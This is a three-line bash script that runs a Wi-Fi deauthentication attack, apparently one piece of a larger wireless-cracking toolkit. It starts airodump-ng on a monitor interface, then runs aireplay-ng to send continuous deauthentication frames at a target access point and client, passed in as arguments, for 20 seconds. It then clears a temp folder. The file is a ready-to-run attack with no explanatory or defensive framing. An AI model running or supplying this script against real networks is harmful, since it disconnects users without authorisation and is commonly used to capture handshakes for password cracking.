#!/bin/bash
xterm -e "airodump-ng mon0" & timeout 20 xterm -e " aireplay-ng -0 0 -a $3 -c $4 $1 --ignore-negative-one"&
rm -rf temp/*
